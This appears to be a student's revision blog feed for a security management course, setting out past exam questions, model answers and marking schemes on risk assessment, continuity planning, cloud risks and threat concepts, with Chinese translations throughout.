</p><p>Procedural controls are those controls that cover the rules, regulations and policies that an organisation puts in place to help reduce the risk of issues arising. An example is a Clear Screen and Desk Policy. </p><blockquote><p>Marking scheme </p><p>3 marks for explaining what procedural controls are, 1 mark if correct example</p></blockquote><blockquote><p>程序性控制是指那些涵盖一个组织为帮助减少问题发生的风险而制定的规则、条例和政策的控制。一个例子是清晰的屏幕和桌面政策</p></blockquote><h4 id="h-What-should-a-disaster-recovery-plan-include"><a href="#h-What-should-a-disaster-recovery-plan-include" class="headerlink" title="h. What should a disaster recovery plan include?"></a>h. What should a disaster recovery plan include?</h4><p>Syllabus: Continuity planning and management. </p><p>A disaster recovery plan should be structured including: </p><ul><li><p>Introduction: – A summary of the objectives and scope of the plan, including IT services and locations covered, the different services, and testing and maintenance activities. Also includes a revision history to track changes. </p></li><li><p>Roles and responsibilities: – A list of the internal and external stakeholders involved in each DR process covered, complete with their contact details and a description of their duties. </p></li><li><p>Incident response: – When should the DR plan be triggered, and how and when should employees, management, partners and customers be notified? </p></li><li><p>DR procedures: – When the DR plan is triggered, the stakeholders can start to action a DR process for each affected IT service. Those procedures are set out step-by-step. </p></li><li><p>Appendices: – A collection of any other lists, forms and documents relevant to the DR plan, such as details on alternate work locations, insurance policies, and the storage and distribution of DR resources. </p><blockquote><p>Marking scheme </p><p>1 mark per part well explained (maximum 4).</p></blockquote></li></ul><blockquote><ul><li>引言： - 计划的目标和范围的摘要，包括涵盖的IT服务和地点，不同的服务，以及测试和维护活动。还包括一个修订历史，以跟踪变化</li><li>角色和责任。- 涵盖的每个DR过程所涉及的内部和外部利益相关者的名单，包括他们的详细联系方式和他们的职责描述</li><li>事件响应。- 什么时候应该触发DR计划，以及如何和何时应该通知员工、管理层、合作伙伴和客户？</li><li>DR程序。- 当DR计划被触发时，利益相关者可以开始为每个受影响的IT服务行动一个DR程序。这些程序是按步骤规定的</li><li>附录。- 与DR计划相关的任何其他清单、表格和文件的集合，例如关于备用工作地点、保险政策以及DR资源的存储和分配的细节</li></ul></blockquote><p>i. What is a Guideline in information security? Give one example. </p><p>Syllabus: Security Organisation and Policies </p><p>They provide advice, direction and best practice in instances where it is often difficult to regulate how something should be done. For example: A code of conduct or working practice when out of the office. </p><blockquote><p>Marking scheme </p><p>2 marks for the definition, 2 marks for an appropriate example.</p></blockquote><blockquote><p>在通常难以规定如何做某事的情况下，他们提供建议、指导和最佳做法。比如说。不在办公室时的行为准则或工作惯例</p></blockquote><h4 id="j-What-is-usable-security-Explain-what-it-means-and-give-one-example-of-usable-security-mechanism"><a href="#j-What-is-usable-security-Explain-what-it-means-and-give-one-example-of-usable-security-mechanism" class="headerlink" title="j. What is usable security? Explain what it means and give one example of usable security mechanism."></a>j. What is usable security? Explain what it means and give one example of usable security mechanism.</h4><p>Syllabus: Usable Security and Human Factors. </p><p>According to the computing research association, usable security is “Give end-users security controls they can understand and privacy they can control for the dynamic, pervasive computing environments of the future”. One example could be the indicators in browsers about whether a connection is secure (HTTPS) or insecure (HTTP). </p><blockquote><p>Marking scheme </p><p>2 marks if they give the definition or alternatively can explain it in their own words, 2 marks for an appropriate example.</p></blockquote><blockquote><p>根据计算研究协会的说法，可用的安全是 “为未来的动态、普遍的计算环境提供他们能够理解的安全控制和他们能够控制的隐私”。一个例子是浏览器中关于连接是否安全（HTTPS）或不安全（HTTP）的指标</p></blockquote><h3 id="Question-Two-1"><a href="#Question-Two-1" class="headerlink" title="Question Two"></a>Question Two</h3><p>GANT is an organisation with over 100,000 members world-wide, it operates in 42 countries and its ultimate goal is to preserve the natterjack toad. Over the past year, GANT’s website has suffered several cyberattacks and this has led to usernames, passwords and credit card details for many members being leaked on the internet. To prevent further cyberattacks, GANT is ready to make information security a top priority amongst its workforce and third-party contractors and has already put in place a chief information security officer (CISO). </p><blockquote><p>GANT是一个在全世界拥有超过10万名成员的组织，它在42个国家开展活动，其最终目标是保护纳特杰克蟾蜍。在过去的一年里，GANT的网站遭受了几次网络攻击，这导致许多会员的用户名、密码和信用卡信息在互联网上被泄露。为了防止进一步的网络攻击，GANT公司准备将信息安全作为其员工和第三方承包商的首要任务，并且已经设立了一个首席信息安全官（CISO）</p></blockquote><h4 id="a-1"><a href="#a-1" class="headerlink" title="a."></a>a.</h4><p>Identify and explain four new security roles that will need to exist in GANT in addition to the CISO.</p><blockquote><p>2020/8 question one a.</p></blockquote><h4 id="b-1"><a href="#b-1" class="headerlink" title="b."></a>b.</h4><p>When defining their information security goals and high-level policies, what type of requirements imposed externally should GANT consider? Explain the type of requirements and give one example per type</p><p>Syllabus: Security Policies and Organisation </p><p>GANT should consider statutory, regulatory, and advisory requirements.</p><p>Statutory requirements are legal requirements that must be fulfilled. For instance law enforcement agencies must be contacted should certain laws be broken or are suspected of being broken. The downloading of child pornography would be such a case. Compliance with these requirements may influence how an enterprise’s incident reporting procedures are organised. For example how, when and by whom should the authorities be contacted? Privacy legislation such as the Data Protection Act will influence how information is stored and managed within the enterprise and how resources are deployed to ensure that it complies with this legislation.</p><p>Regulatory requirements are often imposed by trade bodies, and they specify how an enterprise should operate to conform to certain standards. Although they are not legal obligations, regulatory bodies have extensive powers, and failure to comply could lead to possible fines or, in extreme cases, exclusion from trading in a particular environment. The finance sector is a good example of this as it maintains strict controls to prevent financial malpractices such as fraud or money laundering.</p><p>Advisory requirements may arise from government agencies or utility companies and may provide advice as to what arrangements should be put into place to help cope with instances such as fires, natural disasters and acts of terrorism. These requirements are not legally binding and are generally issued to help encourage best practice.</p><blockquote><p>Marking scheme </p><p>Up to 3 marks per requirement well explained, and 1 mark per example</p></blockquote><h4 id="c"><a href="#c" class="headerlink" title="c."></a>c.</h4><p>As part of their efforts to improve information security management, GANT has decided to put in place a business continuity plan. What steps should the plan include to make it work? Explain them.</p><p>Syllabus: Continuity Planning and Management </p><p>It is a three step process, including: </p><ol><li><p>Assigning Responsibilities </p><ul><li><p>Senior management must approve the plan. </p></li><li><p>Likely an appointment at boardroom or executive level to oversee, and an appointment to take the programme forward. </p></li></ul></li><li><p>Establishing and Implementing the Plan </p><ul><li>Scope, aim and objectives, and the activities required if the plan is triggered, i.e. What are the likely problems that will pop up? How can we deal with them? </li></ul></li><li><p>Ongoing Management </p><ul><li>Regular review of the continuity plan (i.e. it can easily become out of date and no longer reflect real business operations). Similar to the Plan-Do-Check-Act model. </li></ul></li></ol><blockquote><p>Marking scheme </p><p>3 marks for enumerating the steps, one per step. 6 marks for explaining the steps, 2 per step. 1 mark if the explanation has explicit links to other models like Plan-Do-Check-Act.</p></blockquote><h3 id="Question-Three"><a href="#Question-Three" class="headerlink" title="Question Three"></a>Question Three</h3><p>SEM Ltd. is a company that operates an online service 24/7 all days of the year serving 10,000 customers all over the world. SEM Ltd. suffered 80 Denial of Service (DoS) attacks since they started operating 4 years ago. Every time this attack happens, it causes losses of £1 per customer, as their services are not available to their customers until SEM Ltd.’s IT team manage to relaunch the online platform.</p><blockquote><p>SEM有限公司是一家全年24小时运营在线服务的公司，为世界各地的10,000名客户提供服务。SEM有限公司自4年前开始运营以来，遭受了80次拒绝服务（DoS）攻击。每次这种攻击发生，都会给每个客户造成1英镑的损失，因为他们的服务无法提供给客户，直到SEM有限公司的IT团队设法重新启动在线平台</p></blockquote><h4 id="a-2"><a href="#a-2" class="headerlink" title="a."></a>a.</h4><p>Explain what is the Annual Loss Expectancy (ALE) and calculate it for this risk.</p><p>The Annual Loss Expectancy (ALE) is a business-friendly measure of a risk in a quantitative risk assessment approach. It is calculated based on the annual rate of occurrence (ARO) and the single loss expectancy (SLE) for each risk. </p><p>For this risk, the ARO is 80/4 = 20 attacks/year as above and the SLE is £10,000 (10,000 customers at £1 each per attack). Therefore, ALE = ARO × SLE = 20 × 10, 000 = £200,000. </p><blockquote><p>Marking scheme </p><p>1 mark if they describe well what ALE is. 2 marks if they identified the ARO and the impact correctly. 2 marks if they are able to calculate the total ALE correctly for this particular case</p></blockquote><h4 id="b-2"><a href="#b-2" class="headerlink" title="b."></a>b.</h4><p>If an off-the-shelf DoS mitigation appliance costs £45,000 per year, what type of risk treatment would you recommend?  Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><p>Given that the ALE for this risk is £200,000 and the off-the-shelf DoS mitigation appliance costs £45,000, the most reasonable risk treatment type is reduce the risk by buying and installing the appliance.</p><blockquote><p>Marking scheme </p><p>2 marks for identifying the name of the risk treatment type as reduce, 3 marks depending on the detail and correctness of the rationale given for explaining the treatment</p></blockquote><blockquote><p>鉴于这种风险的ALE是200,000英镑，而现成的DoS缓解设备成本为45,000英镑，最合理的风险处理类型是通过购买和安装设备来降低风险</p></blockquote><h4 id="c-1"><a href="#c-1" class="headerlink" title="c."></a>c.</h4><p>If the off-the-shelf DoS mitigation appliance costs £199,000 per year, what type of risk treatment would you recommend? Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><p>Given that the ALE for this risk is £200,000 and the off-the-shelf DoS mitigation appliance costs £199,000, the most reasonable risk treatment type is accept the risk, as it will be costing the company roughly the same. However, this is open to interpretation and one could think that other risk treatment options are possible, in particular reduce if students mention other motives including maintaining customer confidence. Alternative answers should be fine as long as the name of the particular risk treatment type suggested is correct, and there is a well-explained rationale to support it.</p><blockquote><p>Marking scheme </p><p>3 marks for identifying the name of the risk treatment type; 5 marks depending on the detail and correctness of the rationale given for explaining the treatment.</p></blockquote><blockquote><p>鉴于这一风险的ALE是200,000英镑，而现成的DoS缓解设备的成本是199,000英镑，最合理的风险处理类型是接受风险，因为它将使公司的成本大致相同。然而，这是可以解释的，人们可以认为其他的风险处理方案是可能的，特别是如果学生提到其他的动机，包括保持客户的信心，就会减少。只要建议的特定风险处理类型的名称是正确的，并且有充分解释的理由来支持它，其他答案应该是可以的</p></blockquote><h4 id="d"><a href="#d" class="headerlink" title="d."></a>d.</h4><p>As an alternative to the off-the-shelf DoS mitigation appliance, SEM Ltd. are also exploring cloud computing, so that they could elastically expand the instances of their service as a way of replicating it and becoming less vulnerable to DoS. </p><p>What would be the legal implications and security risks if SEM Ltd. relied on cloud computing for their infrastructure?</p><blockquote><p>作为现成的DoS缓解设备的替代方案，SEM有限公司也在探索云计算，这样他们就可以弹性地扩展他们的服务实例，作为一种复制的方式，从而减少对DoS的伤害。</p><p>如果SEM有限公司的基础设施依赖云计算，会有什么法律影响和安全风险？</p></blockquote><p>Syllabus: Security Controls </p><p>Legal implications: They must consider the physical location of services (Data Protection Rules), access to information (cloud provider can read all data), if GANT can audit the cloud provider (verify if the cloud is keeping the data secure) and legal issues around the cloud providers sub-contractors. </p><p>Security Risks: Cloud providers can be hacked and the information is leaked publicly. This is an example of risk-sharing as while the cloud provider is liable - the data leaked can be embarassing to the organisation. Also the data can be deleted/lost if the cloud provider suffers a crash and does not keep regular backups. Or the data could not be deleted completely when needed. </p><blockquote><p>Marking scheme </p><p>4 marks for explaining the legal implications and 4 marks for the security risks.</p></blockquote><blockquote><p>法律影响。他们必须考虑服务的物理位置（数据保护规则），对信息的访问（云供应商可以读取所有数据），GANT是否可以审计云供应商（验证云是否保持数据安全）以及围绕云供应商分包商的法律问题</p><p>安全风险。云供应商可能被黑客攻击，信息被公开泄露。这是一个风险分担的例子，因为虽然云提供商有责任，但泄露的数据可能会使组织感到尴尬。另外，如果云提供商发生崩溃，并且没有保持定期的备份，数据可能会被删除/丢失。或者在需要时不能完全删除数据</p></blockquote><h4 id="e"><a href="#e" class="headerlink" title="e."></a>e.</h4><p>Beyond DoS attacks, SEM Ltd. seem to have received other types of attacks too. In order to know more about what the vulnerabilities are in SEM’s systems, they have hired company, Testers Ltd., to perform a Vulnerability Assessment. At the moment, SEM Ltd does not have a backup infrastructure and any assessments will need to be conducted on the live operational infrastructure. </p><p>What type of Assurance Techniques will be least suitable for this case and why?</p><blockquote><p>除了DoS攻击，SEM公司似乎也收到了其他类型的攻击。为了进一步了解SEM系统的漏洞，他们聘请了Testers Ltd.公司来进行漏洞评估。目前，SEM公司没有一个备份的基础设施，任何评估都需要在运行中的基础设施上进行。</p><p>哪种类型的保证技术最不适合这个案例，为什么？</p></blockquote><p>Syllabus: Vulnerability Assessment </p><p>The least suitable techniques in this case may be testing techniques, such as penetration testing and vulnerability scans, as any issue caused by this more active assurance techniques will entail a risk of information loss and infrastructure unavailability. </p><blockquote><p>Marking scheme </p><p>2 marks for identifying testing techniques as not suitable and 2 marks depending on the explanation.</p></blockquote><blockquote><p>在这种情况下，最不适合的技术可能是测试技术，如渗透测试和漏洞扫描，因为这种更积极的保证技术引起的任何问题都会带来信息损失和基础设施不可用的风险</p></blockquote><h2 id="Past-Exam-Paper-2019"><a href="#Past-Exam-Paper-2019" class="headerlink" title="Past Exam Paper 2019"></a>Past Exam Paper 2019</h2><h3 id="Question-One-2"><a href="#Question-One-2" class="headerlink" title="Question One"></a>Question One</h3><h4 id="a-What-is-Information-Security-and-what-is-its-primary-focus"><a href="#a-What-is-Information-Security-and-what-is-its-primary-focus" class="headerlink" title="a. What is Information Security and what is its primary focus?"></a>a. What is Information Security and what is its primary focus?</h4><p>Syllabus: Security concepts and fundamentals </p><p>The practice of preventing unauthorised access, use, disclosure, disruption, modification, inspection, recording or destruction of information. It focuses on confidentiality, integrity and availability of information. </p><blockquote><p>Marking scheme </p><p>2 marks for the definition and 2 marks for the CIA triad. </p></blockquote><h4 id="b-What-is-a-threat-vulnerability-risk-and-impact"><a href="#b-What-is-a-threat-vulnerability-risk-and-impact" class="headerlink" title="b. What is a threat, vulnerability, risk and impact?"></a>b. What is a threat, vulnerability, risk and impact?</h4><p>Syllabus: Security concepts and fundamentals </p><p>Threat: A potential cause of an incident that may result in the harm to a system or organisation. </p><p>Vulnerability: A weakness of an asset or group of assets that can be exploited by one or more threats. </p><p>Risk. The potential that a given threat will exploit vulnerabilities of an asset or group of assets and thereby cause harm to the organisation. </p><p>Impact: The result of an information security incident, caused by a threat, which affects assets. </p><blockquote><p>Marking scheme </p><p>1 mark for each definition</p></blockquote><h4 id="c-What-is-a-policy-and-procedure-And-how-are-they-different"><a href="#c-What-is-a-policy-and-procedure-And-how-are-they-different" class="headerlink" title="c. What is a policy and procedure? And how are they different?"></a>c. What is a policy and procedure? And how are they different?</h4><p>Syllabus: Security policies. </p><p>Policy is a high level state of an organisation’s values, goals, and objectives in a specific area. A procedure is a set of detailed working instructions that describe what, when, how and by whom something should be done. They are different as a policy sets out the high-level goals and a procedure specifies how something can be done. </p><blockquote><p>Marking scheme </p><p>1 mark for each definition. 2 marks for explaining the difference.</p></blockquote><h4 id="d-What-is-an-anti-virus-and-firewall-And-how-are-they-different"><a href="#d-What-is-an-anti-virus-and-firewall-And-how-are-they-different" class="headerlink" title="d. What is an anti-virus and firewall? And how are they different?"></a>d. What is an anti-virus and firewall? And how are they different?</h4><p>Syllabus: Security Controls </p><p>A firewall is a network security system designed to prevent unauthorised access to or from a private network. An anti-virus scans all files on the computer to detect if they look like a known virus. The difference is that an anti-virus is concerned with finding malware and removing it. Firewall does not scan files, but it is designed to prevent unauthorised access from an external source. </p><blockquote><p>Marking scheme </p><p>1 mark for each definition. 2 marks for explaining the difference.</p></blockquote><h4 id="e-What-is-a-man-in-the-middle-attack-and-what-technical-control-can-prevent-it"><a href="#e-What-is-a-man-in-the-middle-attack-and-what-technical-control-can-prevent-it" class="headerlink" title="e. What is a man in the middle attack and what technical control can prevent it?"></a>e. What is a man in the middle attack and what technical control can prevent it?</h4><p>Syllabus: Security Controls </p><p>An attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. To prevent it, a secure communication channel must be established using cryptography and public key infrastructure. </p><blockquote><p>Marking scheme </p><p>2 mark for definition and 2 marks for explaining how to prevent it.</p></blockquote><h4 id="f-What-is-Residual-Risk-Why-is-it-useful-to-consider-it"><a href="#f-What-is-Residual-Risk-Why-is-it-useful-to-consider-it" class="headerlink" title="f. What is Residual Risk? Why is it useful to consider it?"></a>f. What is Residual Risk? Why is it useful to consider it?</h4><p>Syllabus: Risk Management. </p><p>Residual Risk is the risk left after treating an existing risk (e.g. implementing a security control as a countermeasure). It is useful to consider it to evaluate how much risk is left, as a 100% secure system is impossible to achieve. </p><blockquote><p>Marking scheme </p><p>2 marks if residual risk is defined well, 2 marks if it is explained why it is useful correctly</p></blockquote><h4 id="g-Name-8-assurance-techniques-that-can-be-used-for-vulnerability-assessments"><a href="#g-Name-8-assurance-techniques-that-can-be-used-for-vulnerability-assessments" class="headerlink" title="g. Name 8 assurance techniques that can be used for vulnerability assessments."></a>g. Name 8 assurance techniques that can be used for vulnerability assessments.</h4><p>Syllabus: Vulnerability Assessment. </p><p>Any of the following techniques will be accepted at least: Review of Documented Policies, Procedures, and Processes; Review of Client-Completed Self-Assessment Form; Architectural Review; Configuration Review; Source Code Review; Observations; Interviews; Penetration Test; Read Team Exercise; Vulnerability Scan; Social Engineering Testing; Static Analysis; Dynamic Analysis; Fuzzing; Formal Verification; Cryptographic Validation; Emanation Analysis; Witnessed Test; Public Review. </p><blockquote><p>Marking scheme </p><p>0.5 marks per correct assurance technique named.</p></blockquote><h4 id="h-What-are-the-differences-between-qualitative-and-quantitative-risk-assessment"><a href="#h-What-are-the-differences-between-qualitative-and-quantitative-risk-assessment" class="headerlink" title="h. What are the differences between qualitative and quantitative risk assessment?"></a>h. What are the differences between qualitative and quantitative risk assessment?</h4><p>Syllabus: Risk Assessment. </p><p>Quantitative risk assessment aims to produce reliable statistic evidence, with quantitative probabilities for risk likelihood and quantitative risk impact. A usual methodology is to calculate the annual loss expectancy, which includes the annual rate of occurrence and the single loss expectancy for each risk (ALE = ARO × SLE). Qualitative risk assessment avoids the over simplification to numbers, which helps to draw together the apparently inconsequential bits of information. It considers qualitative probabilities and qualitative/quantitative impacts.</p><blockquote><p>Marking scheme </p><p>1 mark for appropriate description of each risk assessment approach (x2), 2 marks if they highlight well the difference between the two.</p></blockquote><h4 id="i-What-is-a-Market-for-Lemons-and-how-does-it-apply-to-security-economics"><a href="#i-What-is-a-Market-for-Lemons-and-how-does-it-apply-to-security-economics" class="headerlink" title="i. What is a Market for Lemons and how does it apply to security economics?"></a>i. What is a Market for Lemons and how does it apply to security economics?</h4><blockquote><p>“Security Controls Legislation, Cloud Security, Security Economics” Quiz Q4</p></blockquote><blockquote><p>Marking scheme </p><p>1 mark for relationship to asymmetric information, 1 mark for relationship with how good cyber security products might or might not be, 1 mark if lemons example explained well, 1 mark if example of how it applies to security economics</p><p>与不对称信息的关系1分，与好的网络安全产品可能或不可能的关系1分，如果柠檬的例子解释得好，1分，如果它如何适用于安全经济学的例子1分</p></blockquote><h4 id="j-What-does-compliance-with-ISO27001-mean-Does-it-certify-the-state-of-security-of-an-organisation-Explain"><a href="#j-What-does-compliance-with-ISO27001-mean-Does-it-certify-the-state-of-security-of-an-organisation-Explain" class="headerlink" title="j. What does compliance with ISO27001 mean? Does it certify the state of security of an organisation? Explain."></a>j. What does compliance with ISO27001 mean? Does it certify the state of security of an organisation? Explain.</h4><p>Syllabus: Standards and Compliance. </p><p>27001 compliance means that the information security management process described by the ISO27000-series of standards is in place, but it does not certify the state of security an organisation has. That is an organisation compliant with 27001 is not free from cyber security issues. </p><blockquote><p>Marking scheme </p><p>2 marks for correctly stating what compliance means; 2 marks for explaining well why it does not certify the state of security of an organisation.</p></blockquote><blockquote><p>27001合规性意味着ISO27000系列标准所描述的信息安全管理流程已经到位，但它并不能证明一个组织的安全状况。也就是说，一个符合27001标准的组织并不是没有网络安全问题的</p></blockquote><h3 id="Question-Two-2"><a href="#Question-Two-2" class="headerlink" title="Question Two"></a>Question Two</h3><p>GANT is an organisation with over 100,000 members world-wide, it operates in 42 countries and its ultimate goal is to preserve the natterjack toad. Over the past year, GANT’s website has suffered several cyberattacks and this has led to usernames, passwords and credit card details for many members being leaked on the internet. To prevent further cyberattacks, GANT is ready to make information security a top priority amongst its workforce and third-party contractors and has already put in place a chief information security officer (CISO). </p><h4 id="a-3"><a href="#a-3" class="headerlink" title="a."></a>a.</h4><p>What is the purpose of a chief information security officer (CISO)?</p><p>Syllabus: Security Policies and Organisation </p><p>Responsible for protecting their organisation’s computers, networks and data against threats, such as security breaches, computer viruses or attacks by cyber-criminals. </p><blockquote><p>Marking scheme </p><p>6 marks if they explain the purpose of a CISO well.</p></blockquote><blockquote><p>负责保护其组织的计算机、网络和数据免受威胁，如安全漏洞、计算机病毒或网络犯罪分子的攻击</p></blockquote><h4 id="b-3"><a href="#b-3" class="headerlink" title="b."></a>b.</h4><p>Identify and explain four new security roles that will need to exist in GANT in addition to the CISO. </p><blockquote><p>2020/8 question one a.</p></blockquote><h4 id="c-2"><a href="#c-2" class="headerlink" title="c."></a>c.</h4><p>The C-level executives at GANT believe cloud computing can be used to help protect against cyber attacks. </p><p>What is cloud computing and why is it useful? What are the legal implications and security risks if the organisation relies on cloud computing for their infrastructure? </p><blockquote><p>GANT公司的C级管理人员认为，云计算可以用来帮助防范网络攻击。</p><p>什么是云计算，为什么它是有用的？如果组织的基础设施依赖云计算，有什么法律影响和安全风险？</p></blockquote><p>Syllabus: Security Policies and Controls </p><p>Cloud computing is the practice of using a network of remote serves hosted on the Internet to store, manage, and process data, rather than a local server or a personal computer. It is useful as it allows a small company to gain access to powerful computers that would normally be out of reach. </p><p>Legal implications: They must consider the physical location of services (Data Protection Rules), access to information (cloud provider can read all data), if GANT can audit the cloud provider (verify if the cloud is keeping the data secure) and legal issues around the cloud providers sub-contractors. </p><p>Security Risks: Cloud providers can be hacked and the information is leaked publicly. This is an example of risk-sharing as while the cloud provider is liable - the data leaked can be embarassing to the organisation. Also the data can be deleted/lost if the cloud provider suffers a crash and does not keep regular backups. Or the data could not be deleted completely when needed. </p><blockquote><p>Marking scheme </p><p>4 marks for a definition of cloud computing and explaining why it is useful. 4 marks for explaining the legal implications and 4 marks for the security risks.</p></blockquote><h3 id="Question-Three-1"><a href="#Question-Three-1" class="headerlink" title="Question Three"></a>Question Three</h3><p>SEM Ltd. is a company that operates an online service 24/7 all days of the year serving 10,000 customers all over the world. SEM Ltd. suffered 90 Denial of Service (DoS) attacks since they started operating 3 years ago. Every time this attack happens, it causes loses of £1 per customer, as their services are not available to their customers until SEM Ltd.’s IT team manage to relaunch the online platform. </p><h4 id="a-4"><a href="#a-4" class="headerlink" title="a."></a>a.</h4><p>What is the Annualized Rate of Occurrence (ARO) for this risk?</p><p>The Annualized Rate of Occurrence (ARO) is a business-friendly measure of the probability of occurrence of an event that measures how likely an event is to happen during a year. For this risk the ARO is 90/3 = 30 attacks/year. </p><blockquote><p>Marking scheme </p><p>2 marks if they describe well what ARO is. 1 mark if they are able to calculate it correctly for this particular case.</p></blockquote><h4 id="b-4"><a href="#b-4" class="headerlink" title="b."></a>b.</h4><p>What is the Annual Loss Expectancy (ALE) for this risk?</p><p>The Annual Loss Expectancy (ALE) is a business-friendly measure of a risk in a quantitative risk assessment approach. It is calculated based on the annual rate of occurrence (ARO) and the single loss expectancy (SLE) for each risk. For this risk, the ARO is as above and the SLE is £10,000 (10,000 customers at £1 each per attack). Therefore, ALE = ARO×SLE = 30×10, 000 = £300,000.</p><blockquote><p>Marking scheme</p><p>2 marks if they describe well what ALE is. 2 marks if they identified the impact correctly. 2 marks if they are able to calculate the total ALE correctly for this particular case</p></blockquote><h4 id="c-3"><a href="#c-3" class="headerlink" title="c."></a>c.</h4><p>If an off-the-shelf DoS mitigation appliance costs £50,000 per year, what type of risk treatment would you recommend? Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><blockquote><p>如果一个现成的DoS缓解设备每年花费50,000英镑，你会建议哪种类型的风险处理？解释一下原因，包括风险处理类型的具体名称，以及为该风险建议的具体行动</p></blockquote><p>Given that the ALE for this risk is £300,000 and the off-the-shelf DoS mitigation appliance costs £50,000, the most reasonable risk treatment type is reduce the risk by buying and installing the appliance. </p><blockquote><p>鉴于该风险的ALE为300,000英镑，现成的DoS缓解设备成本为50,000英镑，最合理的风险处理类型是通过购买和安装该设备来降低风险</p></blockquote><blockquote><p>Marking scheme </p><p>2 marks for identifying the name of the risk treatment type as reduce, 2 marks depending on the detail and correctness of the rationale given for explaining the treatment.</p></blockquote><h4 id="d-1"><a href="#d-1" class="headerlink" title="d."></a>d.</h4><p>If the off-the-shelf DoS mitigation appliance costs £300,000 per year, what type of risk treatment would you recommend? Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><p>Given that the ALE for this risk is £300,000 and the off-the-shelf DoS mitigation appliance costs £300,000, the most reasonable risk treatment type is accept the risk, as it will be costing the company the same. However, this is open to interpretation and one could think that other risk treatment options are possible. Alternative answers should be fine as long as the name of the particular risk treatment type suggested is correct, and there is a well-explained rationale to support it. </p><blockquote><p>鉴于这一风险的ALE是300,000英镑，而现成的DoS缓解设备的成本是300,000英镑，最合理的风险处理类型是接受这一风险，因为它将给公司带来同样的成本。然而，这是可以解释的，人们可以认为其他的风险处理方案是可能的。只要建议的特定风险处理类型的名称是正确的，并有充分解释的理由来支持它，其他答案应该是可以的</p></blockquote><blockquote><p>Marking scheme </p><p>2 marks for identifying the name of the risk treatment type; 4 marks depending on the detail and correctness of the rationale given for explaining the treatment.</p></blockquote><h4 id="e-1"><a href="#e-1" class="headerlink" title="e."></a>e.</h4><p>If the off-the-shelf DoS mitigation appliance costs £300,000 per year and SEM Ltd. would like to maintain customer confidence, what type of risk treatment would you recommend? Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><blockquote><p>如果现成的DoS缓解设备每年花费300,000英镑，而SEM有限公司希望保持客户的信心，你会建议哪种类型的风险处理？解释一下原因，包括风险处理类型的具体名称，以及为该风险建议的具体行动</p></blockquote><p>Given that the ALE for this risk is £300,000, the off-the-shelf DoS mitigation appliance costs £300,000, and the fact that SEM Ltd. would like to maintain customer confidence, the most reasonable risk treatment type is reduce the risk, as even if it may be costing the company the same, buying and installing the appliance will certainly improve user experience which will help maintain customer confidence in the infrastructure. However, this is open to interpretation and one could think that other risk treatment options are possible. This should be fine as long as the particular risk treatment type name is identified and a well-explained rationale is given for this. </p><blockquote><p>鉴于该风险的ALE为300,000英镑，现成的DoS缓解设备成本为300,000英镑，以及SEM有限公司希望保持客户信心的事实，最合理的风险处理类型是减少风险，因为即使它可能花费公司相同的成本，购买和安装设备肯定会改善用户体验，这将有助于保持客户对基础设施的信心。然而，这一点是可以解释的，人们可以认为其他的风险处理方案是可能的。这应该是没有问题的，只要确定了特定的风险处理类型名称，并为此给出了充分解释的理由</p></blockquote><blockquote><p>Marking scheme </p><p>2 marks for identifying the name of the risk treatment type; 4 marks depending on the detail and correctness of the rationale given for explaining the treatment.</p></blockquote><h4 id="f"><a href="#f" class="headerlink" title="f."></a>f.</h4><p>Beyond DoS attacks, SEM Ltd. seem to have received other types of attacks too. In order to know more about who might be interested in attacking them, they have hired company Testers Ltd. to perform a Threat Assessment. This will hopefully inform them of the Threat Agents that might be interested in attacking them. Imagine that you are Testers Ltd., what are the characteristics you would need to study for each Threat Agent to characterise them? Enumerate and explain them.</p><blockquote><p>除了DoS攻击，SEM有限公司似乎也收到了其他类型的攻击。为了更多地了解谁可能对攻击他们感兴趣，他们聘请了Testers Ltd.公司来进行威胁评估。这将有望告知他们可能对攻击他们感兴趣的威胁代理。假设你是Testers Ltd.，你需要研究每个威胁代理的哪些特征，以确定他们的特点？列举并解释它们</p></blockquote><p>Threat agent Characteristics:</p><p>Motivation - Why are they doing this?, </p><p>Capability - Can they do it and to what level?, </p><p>Catalyst - What set them off?, </p><p>Inhibitors - What has/could put them off?, </p><p>Amplifiers - What has/could push them on? </p><blockquote><p>威胁代理人的特征：</p><p>动机–他们为什么要这样做？ 能力–他们能做到吗，达到什么程度？</p></blockquote><blockquote><p>Marking scheme </p><p>1 marks per each correct characteristic and explanation.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> kcl复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security-management </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>security-management-revision-0x01</title>
      <link href="/2021/12/08/security-management-revision-0x01/"/>
      <url>/2021/12/08/security-management-revision-0x01/</url>
      
        <content type="html"><![CDATA[<h2 id="Threat-risk-vulnerability-impact"><a href="#Threat-risk-vulnerability-impact" class="headerlink" title="Threat, risk, vulnerability, impact"></a>Threat, risk, vulnerability, impact</h2><h3 id="Threat"><a href="#Threat" class="headerlink" title="Threat"></a>Threat</h3><h4 id="0x01-基于什么因素和利害关系去做决定？"><a href="#0x01-基于什么因素和利害关系去做决定？" class="headerlink" title="0x01 基于什么因素和利害关系去做决定？"></a>0x01 基于什么因素和利害关系去做决定？</h4><p>最想保护下面哪个？</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f1.png"></p><blockquote><p>答案取决于谁想攻击和出于什么目的去攻击，这是我们在评估威胁时需要考虑的东西</p></blockquote><h4 id="0x02-威胁来源于什么？"><a href="#0x02-威胁来源于什么？" class="headerlink" title="0x02 威胁来源于什么？"></a>0x02 威胁来源于什么？</h4><ol><li>黑客</li><li>内部威胁(insider threat)。某个超市企业员工因为给自己创建虚假账户牟利被判入狱</li><li>病毒和木马(viruses and trojans) 震网病毒 stuxnet可以操纵大规模工业设备，如分离的核原料离心机，破坏了伊朗核计划</li><li>钓鱼和社工(phishing and social engineering) 如一起针对Google Docs的钓鱼活动，它生成来自Google Docs，然后点击该链接的用户会有被黑客侵入电子邮件账户的风险</li></ol><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><h4 id="0x01-threat-agent"><a href="#0x01-threat-agent" class="headerlink" title="0x01 threat agent"></a>0x01 threat agent</h4><p>An entity who can manifest a threat. It could be internal or external to the organisation or 